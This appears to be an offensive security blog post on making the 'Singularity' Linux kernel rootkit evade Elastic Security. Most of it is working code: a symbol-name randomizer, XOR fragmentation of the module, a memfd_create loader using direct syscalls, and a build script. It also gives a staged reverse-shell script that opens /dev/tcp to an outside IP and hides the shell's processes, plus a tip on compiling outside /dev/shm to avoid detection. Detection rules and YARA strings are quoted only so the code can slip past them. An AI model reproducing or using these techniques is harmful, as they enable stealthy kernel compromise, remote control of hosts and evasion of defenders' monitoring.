Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: 